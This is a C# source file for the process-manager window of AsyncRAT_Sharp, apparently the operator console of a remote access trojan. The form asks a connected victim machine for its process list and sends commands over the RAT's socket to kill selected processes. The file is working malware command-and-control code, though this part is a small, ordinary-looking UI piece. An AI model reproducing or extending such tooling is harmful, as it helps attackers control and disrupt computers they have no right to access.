﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;

namespace AsyncRAT_Sharp.Forms
{
    public partial class ProcessManager : Form
    {
        public ProcessManager()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!C.Client.Connected)
            {
                this.Close();
            }
        }

        private async void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (ListViewItem P in listView1.SelectedItems)
                {
                    await Task.Run(() =>
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "processManager";
                        msgpack.ForcePathObject("Option").AsString = "Kill";
                        msgpack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
                        C.BeginSend(msgpack.Encode2Bytes());
                    });
                }
            }
        }

        private async void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            await Task.Run(() =>
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "processManager";
                msgpack.ForcePathObject("Option").AsString = "List";
                C.BeginSend(msgpack.Encode2Bytes());
            });
        }
    }
}
